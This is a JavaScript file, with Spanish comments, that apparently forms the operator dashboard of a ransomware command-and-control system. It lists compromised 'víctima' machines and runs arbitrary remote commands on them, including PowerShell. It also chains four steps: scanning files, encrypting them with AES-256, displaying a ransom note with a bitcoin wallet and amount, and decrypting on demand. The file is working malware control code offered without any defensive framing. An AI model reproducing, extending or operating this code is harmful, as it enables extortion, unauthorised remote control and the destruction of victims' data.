// ===============================
// LÓGICA PRINCIPAL DEL DASHBOARD
// ===============================

// Estado Global
let clientes = [];
let clienteActual = null;
let currentDirectory = 'C:\\Users';
const socket = io(); // Conexión automática usa window.location

// ===============================
// FUNCIONES GLOBALES (accesibles desde HTML)
// ===============================

// Cambiar directorio actual
window.cambiarDirectorio = function () {
  const newPath = prompt('Ingresa la nueva ruta:', currentDirectory);
  if (newPath && newPath.trim()) {
    currentDirectory = newPath.trim();
    const dirDisplay = document.getElementById('currentDirectory');
    if (dirDisplay) dirDisplay.value = currentDirectory;
  }
};

// Usar ruta personalizada del input
window.usarRutaPersonalizada = function () {
  const input = document.getElementById('customPath');
  if (input && input.value.trim()) {
    currentDirectory = input.value.trim();
    // Añadir al select si no existe
    const select = document.getElementById('currentDirectory');
    if (select) {
      let found = false;
      for (let opt of select.options) {
        if (opt.value === currentDirectory) {
          found = true;
          select.value = currentDirectory;
          break;
        }
      }
      if (!found) {
        const newOpt = document.createElement('option');
        newOpt.value = currentDirectory;
        newOpt.textContent = currentDirectory;
        select.appendChild(newOpt);
        select.value = currentDirectory;
      }
    }
    input.value = '';
  }
};

// Obtener logs del sistema de la víctima
window.obtenerLogsVictima = async function () {
  if (!clienteActual) {
    alert('Selecciona un cliente primero');
    return;
  }

  const systemLogs = document.getElementById('systemLogs');
  if (!systemLogs) return;

  systemLogs.innerHTML = '<div class="log-entry info"><span class="log-time">[...]</span><span class="log-msg">Obteniendo logs del sistema...</span></div>';

  try {
    // Obtener logs de eventos de Windows recientes (últimos 15)
    const response = await fetch('/api/ejecutar-remoto', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        clienteId: clienteActual,
        comando: 'powershell -Command "Get-EventLog -LogName System -Newest 15 | Select-Object TimeGenerated, EntryType, Source, Message | Format-List"'
      })
    });
    // El resultado llegará vía socket
  } catch (e) {
    systemLogs.innerHTML = `<div class="log-entry error"><span class="log-time">[Error]</span><span class="log-msg">${e.message}</span></div>`;
  }
};

// Actualizar visualización del directorio al ejecutar comando
window.actualizarDirectorio = function (newPath) {
  currentDirectory = newPath;
  const dirDisplay = document.getElementById('currentDirectory');
  if (dirDisplay) dirDisplay.textContent = currentDirectory;
};



document.addEventListener('DOMContentLoaded', () => {
  console.log('🏁 DOM Cargado - Inicializando C2 Dashboard...');

  // Elementos del DOM
  const form = document.getElementById('comandoForm');
  const resultadoDiv = document.getElementById('resultado');
  const btnEjecutar = document.getElementById('btnEjecutar');
  const destinoSelect = document.getElementById('destino');
  const btnRefrescarClientes = document.getElementById('btnRefrescarClientes');
  const wsStatus = document.getElementById('wsStatus');
  const clientesStatus = document.getElementById('clientesStatus');
  const activityLog = document.getElementById('activityLog');

  // Carga Inicial
  cargarClientes();

  // ===============================
  // REGISTRO DE ACTIVIDAD
  // ===============================
  function log(message, type = 'info') {
    if (!activityLog) return;
    const time = new Date().toLocaleTimeString();
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    // Usar pre-wrap para mantener formato de tablas y espacios
    entry.innerHTML = `<span class="log-time">[${time}]</span><span class="log-msg" style="white-space: pre-wrap; font-family: 'Courier New', monospace;">${message}</span>`;
    activityLog.appendChild(entry);
    activityLog.scrollTop = activityLog.scrollHeight;
  }

  // ===============================
  // EVENTOS WEBSOCKET
  // ===============================

  // Escuchar logs del servidor (Centralizado)
  socket.on('server-log', (data) => {
    log(data.msg, data.type);
  });

  socket.on('connect', () => {
    log(' Dashboard Conectado', 'success');
    console.log('Socket Conectado:', socket.id);
    setWsStatus(true);
    cargarClientes();
  });

  socket.on('disconnect', () => {
    log(' Dashboard Desconectado', 'error');
    setWsStatus(false);
  });

  socket.on('cliente-conectado', (cliente) => {
    // log(` Cliente conectado: ${cliente.nombre}`, 'success'); // Redundante con server-log
    console.log('Evento cliente conectado:', cliente);
    agregarCliente(cliente);
  });

  socket.on('cliente-desconectado', (data) => {
    // log(` Cliente desconectado: ${data.id.substring(0, 8)}...`, 'error'); // Redundante con server-log
    removerCliente(data.id);
  });

  socket.on('cliente-info-actualizada', (data) => {
    if (clienteActual && clienteActual.id === data.clienteId) {
      mostrarInfoCliente(data.sistemaInfo);
    }
  });

  // Nuevo: Recibir resultado de comando
  socket.on('comando-resultado', (data) => {
    console.log('Resultado Cmd:', data);

    // 1. Mostrar en Log de Actividad (Truncado)
    if (data.output) {
      let cleanOutput = data.output.replace(/\r\n/g, ' ').trim();
      if (cleanOutput.length > 80) cleanOutput = cleanOutput.substring(0, 80) + '...';
      if (cleanOutput) {
        // log(` Output: ${cleanOutput}`, 'info'); // Redundante
      }
    }

    // 2. Si es para el cliente seleccionado, actualizar cuadro de resultado
    if (clienteActual && data.clienteId === clienteActual.id) {
      mostrarResultado({ stdout: data.output || data.error }, "Salida Remota");
    }
  });

  // Nuevo: Recibir actividad generica del cliente
  socket.on('actividad-cliente', (data) => {
    console.log('Actividad:', data);

    // Determinar icono y tipo segun la actividad
    let icono = '';
    let tipo = 'info';

    switch (data.tipo) {
      case 'escaneo':
        icono = '🔍';
        tipo = 'info';
        break;
      case 'cifrado':
        icono = '';
        tipo = 'warning';
        break;
      case 'descifrado':
        icono = '';
        tipo = 'success';
        break;
      case 'nota-rescate':
        icono = '';
        tipo = 'error';
        break;
      case 'comando':
        icono = '';
        tipo = 'info';
        break;
      case 'desconexion':
        icono = '';
        tipo = 'error';
        break;
    }

    // log(`${icono} ${data.mensaje}`, tipo);
    // log(`${icono} ${data.mensaje || 'Actividad desconocida'}`, tipo); // Redundante
  });

  // ===============================
  // Funciones de GESTIÓN DE CLIENTES
  // ===============================
  async function cargarClientes() {
    try {
      console.log('Obteniendo clientes...');
      const response = await fetch('/api/clientes');
      const data = await response.json();

      if (data.success) {
        console.log('Clientes cargados:', data.clientes.length);
        clientes = data.clientes;
        actualizarSelectClientes();
        setClientesStatus(clientes.length);
      }
    } catch (error) {
      console.error('Error al obtener:', error);
      log('Error cargando clientes: ' + error.message, 'error');
    }
  }

  function actualizarSelectClientes() {
    if (!destinoSelect) {
      console.warn('elemento destinoSelect no encontrado en DOM');
      return;
    }

    const valorActual = destinoSelect.value;
    destinoSelect.innerHTML = '<option value="">-- Seleccionar Cliente --</option>';

    clientes.forEach(cliente => {
      const option = document.createElement('option');
      option.value = cliente.id;
      option.textContent = ` ${cliente.nombre} (${cliente.hostname})`;
      destinoSelect.appendChild(option);
    });

    // Restaurar selección si sigue siendo válida
    if (valorActual && clientes.find(c => c.id === valorActual)) {
      destinoSelect.value = valorActual;
    }
  }

  function agregarCliente(cliente) {
    if (!clientes.find(c => c.id === cliente.id)) {
      clientes.push(cliente);
      actualizarSelectClientes();
      setClientesStatus(clientes.length);
    }
  }

  function removerCliente(clienteId) {
    clientes = clientes.filter(c => c.id !== clienteId);
    actualizarSelectClientes();
    setClientesStatus(clientes.length);
    if (destinoSelect && destinoSelect.value === clienteId) {
      destinoSelect.value = '';
      clienteActual = null;
      mostrarInfoCliente(null);
    }
  }

  // Listener para cambio de selección
  if (destinoSelect) {
    destinoSelect.addEventListener('change', () => {
      const clienteId = destinoSelect.value;
      const infoSection = document.getElementById('clientInfoSection');

      if (clienteId) {
        clienteActual = clientes.find(c => c.id === clienteId);
        log(`🎯 Seleccionado: ${clienteActual?.nombre}`, 'info');
        if (infoSection) infoSection.style.display = 'block';
        if (clienteActual?.sistemaInfo) {
          mostrarInfoCliente(clienteActual.sistemaInfo, clienteActual.claveAESCliente || clienteActual.clave);
        }
      } else {
        clienteActual = null;
        if (infoSection) infoSection.style.display = 'none';
      }
    });

    // Manejar foco para refrescar lista si es necesario
    destinoSelect.addEventListener('focus', cargarClientes);
  }

  // Botón Actualizar
  if (btnRefrescarClientes) {
    btnRefrescarClientes.addEventListener('click', () => {
      cargarClientes();
      log('🔄 Actualizando lista...', 'info');
    });
  }

  // ===============================
  // ACCIONES DE COMANDO / CADENA
  // ===============================

  // Exponer funciones globalmente para handlers onclick en HTML
  window.ejecutarPaso = async function (paso) {
    const clienteId = destinoSelect ? destinoSelect.value : null;
    if (!clienteId) {
      log('⚠️ Selecciona un cliente primero', 'warning');
      return;
    }

    // Deshabilitar botón
    const btn = document.getElementById(`btnStep${paso}`);
    if (btn) btn.disabled = true;

    try {
      switch (paso) {
        case 1:
          log(' Paso 1: Obteniendo info...', 'info');
          log(' Paso 1: Solicitud enviada', 'success');
          break;
        case 2:
          log(' Paso 2: Escaneando...', 'info');
          const res2 = await fetch('/api/escanear-archivos', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clienteId })
          });
          const data2 = await res2.json();
          if (data2.success) {
            const resultado = data2.resultado;
            log(` Encontrados: ${resultado.total || 0} archivos (${resultado.tamanioTotalHumano || 'N/A'})`, 'success');
            // Mostrar lista de archivos escaneados
            if (resultado.archivos && resultado.archivos.length > 0) {
              log(`  Archivos encontrados:`, 'info');
              resultado.archivos.slice(0, 20).forEach(a => {
                log(`    📄 ${a.nombre} (${a.tamanio}) | ${a.directorio}`, 'info');
              });
              if (resultado.archivos.length > 20) {
                log(`    ... y ${resultado.archivos.length - 20} más`, 'info');
              }
            }
          } else {
            log(' Error: ' + data2.error, 'error');
          }
          break;
        case 3:
          log(' Paso 3: Cifrando...', 'warning');
          const res3 = await fetch('/api/cifrar-archivos', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clienteId, limite: 100 })
          });
          const data3 = await res3.json();
          if (data3.success) {
            log(` Cifrados: ${data3.resumen.totalCifrados} archivos`, 'success');
            // Mostrar metadatos del cifrado
            if (data3.metadatos) {
              log(`  Algoritmo: ${data3.metadatos.algorithm}`, 'info');
              log(`  Clave: ${data3.metadatos.keyPreview}`, 'info');
            }
            // Mostrar lista de archivos cifrados
            if (data3.archivosCifrados && data3.archivosCifrados.length > 0) {
              log(`  Archivos cifrados:`, 'info');
              data3.archivosCifrados.forEach(a => {
                log(`    📄 ${a.nombre} | IV: ${a.iv.substring(0, 8)}... | ${a.directorio}`, 'info');
              });
            }
            if (document.getElementById('statEncrypted'))
              document.getElementById('statEncrypted').textContent = data3.resumen.totalCifrados;
          } else {
            log(' Error: ' + data3.error, 'error');
          }
          break;
        case 4:
          log(' Paso 4: Ransom Note...', 'warning');
          const res4 = await fetch('/api/mostrar-nota', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clienteId, wallet: '1KP7...', amount: '2' })
          });
          const data4 = await res4.json();
          if (data4.success) log(' Nota mostrada', 'success');
          else log(' Error: ' + data4.error, 'error');
          break;
      }
    } catch (e) {
      log(' Exception: ' + e.message, 'error');
    }
    if (btn) btn.disabled = false;
  };

  window.ejecutarCadenaCompleta = async function () {
    if (!destinoSelect || !destinoSelect.value) {
      log(' Selecciona cliente', 'warning');
      return;
    }
    log(' Ejecutando secuencia completa...', 'warning');
    const btn = document.getElementById('btnFull');
    if (btn) btn.disabled = true;

    for (let i = 1; i <= 4; i++) {
      await window.ejecutarPaso(i);
      await new Promise(r => setTimeout(r, 1500));
    }
    log('🏁 Secuencia finalizada', 'success');
    if (btn) btn.disabled = false;
  };

  window.descifrarArchivos = async function () {
    const clienteId = destinoSelect ? destinoSelect.value : null;
    if (!clienteId) return;

    log(' Iniciando descifrado...', 'info');
    try {
      const res = await fetch('/api/descifrar-archivos', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clienteId })
      });
      const data = await res.json();
      if (data.success) {
        log(` Restaurados: ${data.totalDescifrados} archivos`, 'success');
        if (document.getElementById('statEncrypted'))
          document.getElementById('statEncrypted').textContent = '0';
      } else {
        log(' Error: ' + data.error, 'error');
      }
    } catch (e) {
      log(' Error: ' + e.message, 'error');
    }
  };

  // ===============================
  // EJECUCIÓN DE COMANDO
  // ===============================
  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const input = document.getElementById('comando');
      const cmd = input.value.trim();
      const cid = destinoSelect ? destinoSelect.value : null;

      if (!cmd || !cid) return;

      if (btnEjecutar) btnEjecutar.disabled = true;
      log(`> ${cmd}`, 'info');

      try {
        const res = await fetch('/api/ejecutar-remoto', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clienteId: cid, comando: cmd })
        });
        const d = await res.json();
        if (d.resultado) mostrarResultado(d.resultado, cmd);
      } catch (e) {
        log(' Error: ' + e.message, 'error');
      }

      if (btnEjecutar) btnEjecutar.disabled = false;
      input.value = '';
    });
  }

  // ===============================
  // FUNCIONES AUXILIARES DE VISUALIZACIÓN
  // ===============================
  function mostrarInfoCliente(info, clave) {
    const el = document.getElementById('clientInfoDetails');
    if (!el) return;
    if (!info) { el.innerHTML = ''; return; }

    // Mostrar clave truncada para display, completa en title
    const claveDisplay = clave ? (clave.length > 20 ? clave.substring(0, 20) + '...' : clave) : 'N/A';

    el.innerHTML = `
        <div style="font-size:12px; display:grid; grid-template-columns:1fr 1fr; gap:5px;">
        <div><span style="color:#888">User:</span> <b>${info.username}</b></div>
        <div><span style="color:#888">Host:</span> <b>${info.hostname}</b></div>
        <div><span style="color:#888">OS:</span> <b>${info.platform}</b></div>
        <div><span style="color:#888">RAM:</span> <b>${info.freeMemory}/${info.totalMemory}</b></div>
        </div>
        <div style="margin-top:10px; padding:8px; background:#1e1e2d; border-radius:4px;">
          <span style="color:#888; font-size:11px;"> Clave AES-256:</span>
          <div style="font-family:monospace; font-size:10px; color:#0f0; word-break:break-all; margin-top:4px; cursor:pointer;" 
               title="${clave || 'No disponible'}"
               onclick="navigator.clipboard.writeText('${clave || ''}').then(() => alert('Clave copiada al portapapeles'))">
            ${claveDisplay}
            <span style="color:#888; font-size:9px; margin-left:5px;">(click para copiar)</span>
          </div>
        </div>
     `;
  }

  function mostrarResultado(res, cmd) {
    if (!resultadoDiv) return;
    resultadoDiv.innerHTML = `<div style="background:#222; color:#eee; padding:10px; border-radius:4px; font-family:monospace; margin-top:10px;">
        <div style="opacity:0.7; border-bottom:1px solid #444; margin-bottom:5px;">$ ${cmd}</div>
        <pre style="margin:2px 0; color:#ccc">${res.stdout || ''}</pre>
        <pre style="margin:2px 0; color:#f66">${res.stderr || ''}</pre>
      </div>`;
  }

  function mostrarResumenEscaneo(res) {
    if (!resultadoDiv) return;
    let html = `<div style="padding:10px; background:#f0f4f8; border-radius:4px; margin-top:10px;">
        <h4>Resultados Escaneo</h4>
        <p>Total: <b>${res.total}</b> (${res.tamanioTotalHumano})</p>`;

    if (res.porCategoria) {
      html += '<div style="display:flex; gap:5px; flex-wrap:wrap; margin-top:5px;">';
      for (const [k, v] of Object.entries(res.porCategoria)) {
        html += `<span style="background:#ddd; padding:2px 6px; border-radius:4px; font-size:11px;">${k}: ${v.cantidad}</span>`;
      }
      html += '</div>';
    }
    html += '</div>';
    resultadoDiv.innerHTML = html;
  }

  function setWsStatus(ok) {
    if (!wsStatus) return;
    wsStatus.innerHTML = ok
      ? '<span class="status-indicator online" style="background:#1bc5bd; width:8px; height:8px; display:inline-block; border-radius:50%; margin-right:5px;"></span> WS: Online'
      : '<span class="status-indicator offline" style="background:#f64e60; width:8px; height:8px; display:inline-block; border-radius:50%; margin-right:5px;"></span> WS: Offline';
  }

  function setClientesStatus(n) {
    if (clientesStatus) clientesStatus.textContent = n;
  }

});